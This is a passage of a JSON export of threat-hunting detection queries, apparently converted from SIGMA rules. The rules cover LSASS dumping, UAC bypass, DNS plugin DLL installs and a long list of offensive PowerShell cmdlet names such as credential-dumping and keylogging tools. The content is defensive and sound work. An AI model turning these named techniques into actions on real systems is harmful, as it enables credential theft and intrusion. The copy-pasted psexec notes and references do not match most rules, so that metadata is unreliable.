            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 826
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Adversaries may look for details about the network configuration and settings of systems they access or through information discovery of remote systems",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1016"
            ],
            "name": "Suspicious Network Command",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"ipconfig /all\" or tgt.process.cmdline contains \"netsh interface show interface\" or tgt.process.cmdline contains \"arp -a\" or tgt.process.cmdline contains \"nbtstat -n\" or tgt.process.cmdline contains \"net config\" or tgt.process.cmdline contains \"route print\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 827
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of \"csc.exe\" to compile .NET code. Attackers often leverage this to compile code on the fly and use it in other stages.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1027"
            ],
            "name": "Dynamic .NET Compilation Via Csc.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\csc.exe\" and ((tgt.process.cmdline contains \":\\Perflogs\\\" or tgt.process.cmdline contains \":\\Users\\Public\\\" or tgt.process.cmdline contains \"\\AppData\\Local\\Temp\\\" or tgt.process.cmdline contains \"\\Temporary Internet\" or tgt.process.cmdline contains \"\\Windows\\Temp\\\") or ((tgt.process.cmdline contains \":\\Users\\\" and tgt.process.cmdline contains \"\\Favorites\\\") or (tgt.process.cmdline contains \":\\Users\\\" and tgt.process.cmdline contains \"\\Favourites\\\") or (tgt.process.cmdline contains \":\\Users\\\" and tgt.process.cmdline contains \"\\Contacts\\\") or (tgt.process.cmdline contains \":\\Users\\\" and tgt.process.cmdline contains \"\\Pictures\\\")) or tgt.process.cmdline matches \"([Pp]rogram[Dd]ata|%([Ll]ocal)?[Aa]pp[Dd]ata%|\\\\\\\\[Aa]pp[Dd]ata\\\\\\\\([Ll]ocal([Ll]ow)?|[Rr]oaming))\\\\\\\\[^\\\\\\\\]{1,256}$\") and (not ((src.process.image.path contains \"C:\\Program Files (x86)\\\" or src.process.image.path contains \"C:\\Program Files\\\") or src.process.image.path=\"C:\\Windows\\System32\\sdiagnhost.exe\" or src.process.image.path=\"C:\\Windows\\System32\\inetsrv\\w3wp.exe\")) and (not ((src.process.image.path in (\"C:\\ProgramData\\chocolatey\\choco.exe\",\"C:\\ProgramData\\chocolatey\\tools\\shimgen.exe\")) or src.process.cmdline contains \"\\ProgramData\\Microsoft\\Windows Defender Advanced Threat Protection\" or (src.process.cmdline contains \"JwB7ACIAZgBhAGkAbABlAGQAIgA6AHQAcgB1AGUALAAiAG0AcwBnACIAOgAiAEEAbgBzAGkAYgBsAGUAIAByAGUAcQB1AGkAcgBlAHMAIABQAG8AdwBlAHIAUwBoAGUAbABsACAAdgAzAC4AMAAgAG8AcgAgAG4AZQB3AGUAcgAiAH0AJw\" or src.process.cmdline contains \"cAewAiAGYAYQBpAGwAZQBkACIAOgB0AHIAdQBlACwAIgBtAHMAZwAiADoAIgBBAG4AcwBpAGIAbABlACAAcgBlAHEAdQBpAHIAZQBzACAAUABvAHcAZQByAFMAaABlAGwAbAAgAHYAMwAuADAAIABvAHIAIABuAGUAdwBlAHIAIgB9ACcA\" or src.process.cmdline contains \"nAHsAIgBmAGEAaQBsAGUAZAAiADoAdAByAHUAZQAsACIAbQBzAGcAIgA6ACIAQQBuAHMAaQBiAGwAZQAgAHIAZQBxAHUAaQByAGUAcwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIAB2ADMALgAwACAAbwByACAAbgBlAHcAZQByACIAfQAnA\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 828
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the presence of the keywords \"lsass\" and \".dmp\" in the commandline, which could indicate a potential attempt to dump or create a dump of the lsass process.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1003"
            ],
            "name": "LSASS Dump Keyword In CommandLine",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"lsass.dmp\" or tgt.process.cmdline contains \"lsass.zip\" or tgt.process.cmdline contains \"lsass.rar\" or tgt.process.cmdline contains \"Andrew.dmp\" or tgt.process.cmdline contains \"Coredump.dmp\" or tgt.process.cmdline contains \"NotLSASS.zip\" or tgt.process.cmdline contains \"lsass_2\" or tgt.process.cmdline contains \"lsassdump\" or tgt.process.cmdline contains \"lsassdmp\") or (tgt.process.cmdline contains \"lsass\" and tgt.process.cmdline contains \".dmp\") or (tgt.process.cmdline contains \"SQLDmpr\" and tgt.process.cmdline contains \".mdmp\") or (tgt.process.cmdline contains \"nanodump\" and tgt.process.cmdline contains \".dmp\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 829
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the installation of a DNS plugin DLL via ServerLevelPluginDll parameter in registry, which can be used to execute code in context of the DNS server (restart required)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1574",
                "t1112"
            ],
            "name": "New DNS ServerLevelPluginDll Installed Via Dnscmd.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\dnscmd.exe\" and (tgt.process.cmdline contains \"/config\" and tgt.process.cmdline contains \"/serverlevelplugindll\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 830
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a suspicious command line execution that invokes PowerShell with reference to an AppData folder",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "PowerShell Script Run in AppData",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"powershell.exe\" or tgt.process.cmdline contains \"\\powershell\" or tgt.process.cmdline contains \"\\pwsh\" or tgt.process.cmdline contains \"pwsh.exe\") and ((tgt.process.cmdline contains \"/c \" and tgt.process.cmdline contains \"\\AppData\\\") and (tgt.process.cmdline contains \"Local\\\" or tgt.process.cmdline contains \"Roaming\\\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 831
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of the \"wusa.exe\" (Windows Update Standalone Installer) utility to extract \".cab\" files using the \"/extract\" argument from potentially suspicious paths.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Cab File Extraction Via Wusa.EXE From Potentially Suspicious Paths",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\wusa.exe\" and tgt.process.cmdline contains \"/extract:\") and (tgt.process.cmdline contains \":\\PerfLogs\\\" or tgt.process.cmdline contains \":\\Users\\Public\\\" or tgt.process.cmdline contains \":\\Windows\\Temp\\\" or tgt.process.cmdline contains \"\\Appdata\\Local\\Temp\\\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 832
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects an uncommon svchost parent process",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1036"
            ],
            "name": "Uncommon Svchost Parent Process",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\svchost.exe\" and (not ((src.process.image.path contains \"\\Mrt.exe\" or src.process.image.path contains \"\\MsMpEng.exe\" or src.process.image.path contains \"\\ngen.exe\" or src.process.image.path contains \"\\rpcnet.exe\" or src.process.image.path contains \"\\services.exe\" or src.process.image.path contains \"\\TiWorker.exe\") or not (src.process.image.path matches \"\\.*\") or (src.process.image.path in (\"-\",\"\"))))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 833
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects Commandlet names from well-known PowerShell exploitation frameworks",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1482",
                "t1087",
                "t1087",
                "t1087",
                "t1069",
                "t1069",
                "t1069",
                "t1059"
            ],
            "name": "Malicious PowerShell Commandlets - ProcessCreation",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"Add-Exfiltration\" or tgt.process.cmdline contains \"Add-Persistence\" or tgt.process.cmdline contains \"Add-RegBackdoor\" or tgt.process.cmdline contains \"Add-RemoteRegBackdoor\" or tgt.process.cmdline contains \"Add-ScrnSaveBackdoor\" or tgt.process.cmdline contains \"Check-VM\" or tgt.process.cmdline contains \"ConvertTo-Rc4ByteStream\" or tgt.process.cmdline contains \"Decrypt-Hash\" or tgt.process.cmdline contains \"Disable-ADIDNSNode\" or tgt.process.cmdline contains \"Disable-MachineAccount\" or tgt.process.cmdline contains \"Do-Exfiltration\" or tgt.process.cmdline contains \"Enable-ADIDNSNode\" or tgt.process.cmdline contains \"Enable-MachineAccount\" or tgt.process.cmdline contains \"Enabled-DuplicateToken\" or tgt.process.cmdline contains \"Exploit-Jboss\" or tgt.process.cmdline contains \"Export-ADR\" or tgt.process.cmdline contains \"Export-ADRCSV\" or tgt.process.cmdline contains \"Export-ADRExcel\" or tgt.process.cmdline contains \"Export-ADRHTML\" or tgt.process.cmdline contains \"Export-ADRJSON\" or tgt.process.cmdline contains \"Export-ADRXML\" or tgt.process.cmdline contains \"Find-Fruit\" or tgt.process.cmdline contains \"Find-GPOLocation\" or tgt.process.cmdline contains \"Find-TrustedDocuments\" or tgt.process.cmdline contains \"Get-ADIDNS\" or tgt.process.cmdline contains \"Get-ApplicationHost\" or tgt.process.cmdline contains \"Get-ChromeDump\" or tgt.process.cmdline contains \"Get-ClipboardContents\" or tgt.process.cmdline contains \"Get-FoxDump\" or tgt.process.cmdline contains \"Get-GPPPassword\" or tgt.process.cmdline contains \"Get-IndexedItem\" or tgt.process.cmdline contains \"Get-KerberosAESKey\" or tgt.process.cmdline contains \"Get-Keystrokes\" or tgt.process.cmdline contains \"Get-LSASecret\" or tgt.process.cmdline contains \"Get-MachineAccountAttribute\" or tgt.process.cmdline contains \"Get-MachineAccountCreator\" or tgt.process.cmdline contains \"Get-PassHashes\" or tgt.process.cmdline contains \"Get-RegAlwaysInstallElevated\" or tgt.process.cmdline contains \"Get-RegAutoLogon\" or tgt.process.cmdline contains \"Get-RemoteBootKey\" or tgt.process.cmdline contains \"Get-RemoteCachedCredential\" or tgt.process.cmdline contains \"Get-RemoteLocalAccountHash\" or tgt.process.cmdline contains \"Get-RemoteLSAKey\" or tgt.process.cmdline contains \"Get-RemoteMachineAccountHash\" or tgt.process.cmdline contains \"Get-RemoteNLKMKey\" or tgt.process.cmdline contains \"Get-RickAstley\" or tgt.process.cmdline contains \"Get-Screenshot\" or tgt.process.cmdline contains \"Get-SecurityPackages\" or tgt.process.cmdline contains \"Get-ServiceFilePermission\" or tgt.process.cmdline contains \"Get-ServicePermission\" or tgt.process.cmdline contains \"Get-ServiceUnquoted\" or tgt.process.cmdline contains \"Get-SiteListPassword\" or tgt.process.cmdline contains \"Get-System\" or tgt.process.cmdline contains \"Get-TimedScreenshot\" or tgt.process.cmdline contains \"Get-UnattendedInstallFile\" or tgt.process.cmdline contains \"Get-Unconstrained\" or tgt.process.cmdline contains \"Get-USBKeystrokes\" or tgt.process.cmdline contains \"Get-VaultCredential\" or tgt.process.cmdline contains \"Get-VulnAutoRun\" or tgt.process.cmdline contains \"Get-VulnSchTask\" or tgt.process.cmdline contains \"Grant-ADIDNSPermission\" or tgt.process.cmdline contains \"Gupt-Backdoor\" or tgt.process.cmdline contains \"HTTP-Login\" or tgt.process.cmdline contains \"Install-ServiceBinary\" or tgt.process.cmdline contains \"Install-SSP\" or tgt.process.cmdline contains \"Invoke-ACLScanner\" or tgt.process.cmdline contains \"Invoke-ADRecon\" or tgt.process.cmdline contains \"Invoke-ADSBackdoor\" or tgt.process.cmdline contains \"Invoke-AgentSmith\" or tgt.process.cmdline contains \"Invoke-AllChecks\" or tgt.process.cmdline contains \"Invoke-ARPScan\" or tgt.process.cmdline contains \"Invoke-AzureHound\" or tgt.process.cmdline contains \"Invoke-BackdoorLNK\" or tgt.process.cmdline contains \"Invoke-BadPotato\" or tgt.process.cmdline contains \"Invoke-BetterSafetyKatz\" or tgt.process.cmdline contains \"Invoke-BypassUAC\" or tgt.process.cmdline contains \"Invoke-Carbuncle\" or tgt.process.cmdline contains \"Invoke-Certify\" or tgt.process.cmdline contains \"Invoke-ConPtyShell\" or tgt.process.cmdline contains \"Invoke-CredentialInjection\" or tgt.process.cmdline contains \"Invoke-DAFT\" or tgt.process.cmdline contains \"Invoke-DCSync\" or tgt.process.cmdline contains \"Invoke-DinvokeKatz\" or tgt.process.cmdline contains \"Invoke-DllInjection\" or tgt.process.cmdline contains \"Invoke-DNSUpdate\" or tgt.process.cmdline contains \"Invoke-DomainPasswordSpray\" or tgt.process.cmdline contains \"Invoke-DowngradeAccount\" or tgt.process.cmdline contains \"Invoke-EgressCheck\" or tgt.process.cmdline contains \"Invoke-Eyewitness\" or tgt.process.cmdline contains \"Invoke-FakeLogonScreen\" or tgt.process.cmdline contains \"Invoke-Farmer\" or tgt.process.cmdline contains \"Invoke-Get-RBCD-Threaded\" or tgt.process.cmdline contains \"Invoke-Gopher\" or tgt.process.cmdline contains \"Invoke-Grouper\" or tgt.process.cmdline contains \"Invoke-HandleKatz\" or tgt.process.cmdline contains \"Invoke-ImpersonatedProcess\" or tgt.process.cmdline contains \"Invoke-ImpersonateSystem\" or tgt.process.cmdline contains \"Invoke-InteractiveSystemPowerShell\" or tgt.process.cmdline contains \"Invoke-Internalmonologue\" or tgt.process.cmdline contains \"Invoke-Inveigh\" or tgt.process.cmdline contains \"Invoke-InveighRelay\" or tgt.process.cmdline contains \"Invoke-KrbRelay\" or tgt.process.cmdline contains \"Invoke-LdapSignCheck\" or tgt.process.cmdline contains \"Invoke-Lockless\" or tgt.process.cmdline contains \"Invoke-MalSCCM\" or tgt.process.cmdline contains \"Invoke-Mimikatz\" or tgt.process.cmdline contains \"Invoke-Mimikittenz\" or tgt.process.cmdline contains \"Invoke-MITM6\" or tgt.process.cmdline contains \"Invoke-NanoDump\" or tgt.process.cmdline contains \"Invoke-NetRipper\" or tgt.process.cmdline contains \"Invoke-Nightmare\" or tgt.process.cmdline contains \"Invoke-NinjaCopy\" or tgt.process.cmdline contains \"Invoke-OfficeScrape\" or tgt.process.cmdline contains \"Invoke-OxidResolver\" or tgt.process.cmdline contains \"Invoke-P0wnedshell\" or tgt.process.cmdline contains \"Invoke-Paranoia\" or tgt.process.cmdline contains \"Invoke-PortScan\" or tgt.process.cmdline contains \"Invoke-PoshRatHttp\" or tgt.process.cmdline contains \"Invoke-PostExfil\" or tgt.process.cmdline contains \"Invoke-PowerDump\" or tgt.process.cmdline contains \"Invoke-PowerShellTCP\" or tgt.process.cmdline contains \"Invoke-PowerShellWMI\" or tgt.process.cmdline contains \"Invoke-PPLDump\" or tgt.process.cmdline contains \"Invoke-PsExec\" or tgt.process.cmdline contains \"Invoke-PSInject\" or tgt.process.cmdline contains \"Invoke-PsUaCme\" or tgt.process.cmdline contains \"Invoke-ReflectivePEInjection\" or tgt.process.cmdline contains \"Invoke-ReverseDNSLookup\" or tgt.process.cmdline contains \"Invoke-Rubeus\" or tgt.process.cmdline contains \"Invoke-RunAs\" or tgt.process.cmdline contains \"Invoke-SafetyKatz\" or tgt.process.cmdline contains \"Invoke-SauronEye\" or tgt.process.cmdline contains \"Invoke-SCShell\" or tgt.process.cmdline contains \"Invoke-Seatbelt\" or tgt.process.cmdline contains \"Invoke-ServiceAbuse\" or tgt.process.cmdline contains \"Invoke-ShadowSpray\" or tgt.process.cmdline contains \"Invoke-Sharp\" or tgt.process.cmdline contains \"Invoke-Shellcode\" or tgt.process.cmdline contains \"Invoke-SMBScanner\" or tgt.process.cmdline contains \"Invoke-Snaffler\" or tgt.process.cmdline contains \"Invoke-Spoolsample\" or tgt.process.cmdline contains \"Invoke-SpraySinglePassword\" or tgt.process.cmdline contains \"Invoke-SSHCommand\" or tgt.process.cmdline contains \"Invoke-StandIn\" or tgt.process.cmdline contains \"Invoke-StickyNotesExtract\" or tgt.process.cmdline contains \"Invoke-SystemCommand\" or tgt.process.cmdline contains \"Invoke-Tasksbackdoor\" or tgt.process.cmdline contains \"Invoke-Tater\" or tgt.process.cmdline contains \"Invoke-Thunderfox\" or tgt.process.cmdline contains \"Invoke-ThunderStruck\" or tgt.process.cmdline contains \"Invoke-TokenManipulation\" or tgt.process.cmdline contains \"Invoke-Tokenvator\" or tgt.process.cmdline contains \"Invoke-TotalExec\" or tgt.process.cmdline contains \"Invoke-UrbanBishop\" or tgt.process.cmdline contains \"Invoke-UserHunter\" or tgt.process.cmdline contains \"Invoke-VoiceTroll\" or tgt.process.cmdline contains \"Invoke-Whisker\" or tgt.process.cmdline contains \"Invoke-WinEnum\" or tgt.process.cmdline contains \"Invoke-winPEAS\" or tgt.process.cmdline contains \"Invoke-WireTap\" or tgt.process.cmdline contains \"Invoke-WmiCommand\" or tgt.process.cmdline contains \"Invoke-WMIExec\" or tgt.process.cmdline contains \"Invoke-WScriptBypassUAC\" or tgt.process.cmdline contains \"Invoke-Zerologon\" or tgt.process.cmdline contains \"MailRaider\" or tgt.process.cmdline contains \"New-ADIDNSNode\" or tgt.process.cmdline contains \"New-DNSRecordArray\" or tgt.process.cmdline contains \"New-HoneyHash\" or tgt.process.cmdline contains \"New-InMemoryModule\" or tgt.process.cmdline contains \"New-MachineAccount\" or tgt.process.cmdline contains \"New-SOASerialNumberArray\" or tgt.process.cmdline contains \"Out-Minidump\" or tgt.process.cmdline contains \"Port-Scan\" or tgt.process.cmdline contains \"PowerBreach\" or tgt.process.cmdline contains \"powercat \" or tgt.process.cmdline contains \"PowerUp\" or tgt.process.cmdline contains \"PowerView\" or tgt.process.cmdline contains \"Remove-ADIDNSNode\" or tgt.process.cmdline contains \"Remove-MachineAccount\" or tgt.process.cmdline contains \"Remove-Update\" or tgt.process.cmdline contains \"Rename-ADIDNSNode\" or tgt.process.cmdline contains \"Revoke-ADIDNSPermission\" or tgt.process.cmdline contains \"Set-ADIDNSNode\" or tgt.process.cmdline contains \"Set-MacAttribute\" or tgt.process.cmdline contains \"Set-MachineAccountAttribute\" or tgt.process.cmdline contains \"Set-Wallpaper\" or tgt.process.cmdline contains \"Show-TargetScreen\" or tgt.process.cmdline contains \"Start-CaptureServer\" or tgt.process.cmdline contains \"Start-Dnscat2\" or tgt.process.cmdline contains \"Start-WebcamRecorder\" or tgt.process.cmdline contains \"VolumeShadowCopyTools\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 834
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects commands that indicate a Raccine removal from an end system. Raccine is a free ransomware protection tool.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1562"
            ],
            "name": "Raccine Uninstall",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"taskkill \" and tgt.process.cmdline contains \"RaccineSettings.exe\") or (tgt.process.cmdline contains \"reg.exe\" and tgt.process.cmdline contains \"delete\" and tgt.process.cmdline contains \"Raccine Tray\") or (tgt.process.cmdline contains \"schtasks\" and tgt.process.cmdline contains \"/DELETE\" and tgt.process.cmdline contains \"Raccine Rules Updater\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 835
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the pattern of UAC Bypass using IEInstal.exe (UACMe 64)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1548"
            ],
            "name": "UAC Bypass Using IEInstal - Process",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
